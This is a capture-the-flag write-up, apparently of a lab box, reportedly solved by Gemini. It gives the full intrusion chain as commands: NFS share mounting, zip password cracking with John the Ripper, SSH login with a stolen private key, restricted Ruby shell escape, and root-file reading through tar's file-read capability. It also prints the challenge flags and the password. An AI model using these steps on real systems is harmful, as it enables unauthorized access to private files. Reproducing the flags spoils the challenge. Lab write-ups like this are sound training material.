# The Server From Hell - CTF Writeup
(*solved by gemini🤖🤖🤖*)
## Enumeration
The initial challenge description provided a target IP (10.49.160.230) and a starting point: port 1337.
Scanning port 1337 with Nmap revealed a custom service returning a text banner:
```bash
nmap -sV -sC -p 1337 10.49.160.230
```
**Banner Output:**
```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

## The NFS Share
Port 21's banner hinted at port 12345: `550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00`. 
Scanning port 12345 revealed a hint about NFS:
```bash
nmap -sV -sC -p 12345 10.49.160.230
```
**Output:**
```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

A check using `showmount -e 10.49.160.230` revealed an exported share: `/home/nfs`.
With local `sudo` privileges provided externally, the share was successfully mounted:
```bash
mkdir nfs_share
sudo mount -t nfs -o nolock,insecure 10.49.160.230:/home/nfs /home/kali/ServerHell/nfs_share
ls -la /home/kali/ServerHell/nfs_share
```
This revealed a file named `backup.zip`.

## Cracking the Backup
The `backup.zip` file was password-protected. `zip2john` was used to extract the hash, which was then cracked using John the Ripper and the `rockyou.txt` wordlist.
```bash
cp /home/kali/ServerHell/nfs_share/backup.zip .
zip2john backup.zip > backup.hash
john --wordlist=/home/kali/rockyou.txt backup.hash
```
**Cracked Password:** `zxcvbnm`

Extracting the zip file revealed several files belonging to the user `hades`:
```bash
unzip -P zxcvbnm backup.zip
```
Files extracted included:
*   `.ssh/id_rsa` (Private SSH Key)
*   `.ssh/flag.txt` -> **Flag 1:** `thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}`
*   `.ssh/hint.txt` -> Contained the text: `2500-4500`

## SSH and IRB Shell Escape
The `hint.txt` pointed to a port range. An Nmap scan of ports 2500-4500 showed every port as "open" (Server Hell). However, port 3333 was found to be the actual SSH service.

Using the extracted private key, an SSH connection was established:
```bash
chmod 600 backup_content/home/hades/.ssh/id_rsa
ssh -i backup_content/home/hades/.ssh/id_rsa -p 3333 -o StrictHostKeyChecking=no hades@10.49.160.230
```
Upon connecting, the user was dropped into a restricted Interactive Ruby (IRB) shell instead of a standard bash shell.

To execute commands and read files, Ruby syntax was required. 
Reading the user flag:
```bash
echo 'puts File.read("/home/hades/user.txt")' | ssh -i backup_content/home/hades/.ssh/id_rsa -p 3333 -o StrictHostKeyChecking=no hades@10.49.160.230
```
**Flag 2:** `thm{sh3ll_3c4p3_15_v3ry_1337}`

## Privilege Escalation
To find a path to root, the system was enumerated for SUID binaries and capabilities using the IRB shell.
```bash
echo 'puts `sudo -n -l; getcap -r / 2>/dev/null` ' | ssh -i backup_content/home/hades/.ssh/id_rsa -p 3333 -o StrictHostKeyChecking=no hades@10.49.160.230
```
The `getcap` command revealed an interesting misconfiguration:
`/bin/tar = cap_dac_read_search+ep`

The `cap_dac_read_search` capability allows a program to bypass file read permission checks and directory read and execute permission checks. Since `tar` had this capability, it could be used to read any file on the system, including `/root/root.txt`.

The `tar` command was used via the IRB shell to archive the root flag into `/tmp/` and then immediately extract its contents to standard output:
```bash
echo 'puts `tar -cvf /tmp/root.tar /root/root.txt 2>/dev/null; tar -xf /tmp/root.tar -O` ' | ssh -i backup_content/home/hades/.ssh/id_rsa -p 3333 -o StrictHostKeyChecking=no hades@10.49.160.230
```
**Flag 3:** `thm{w0w_n1c3_3sc4l4t10n}`
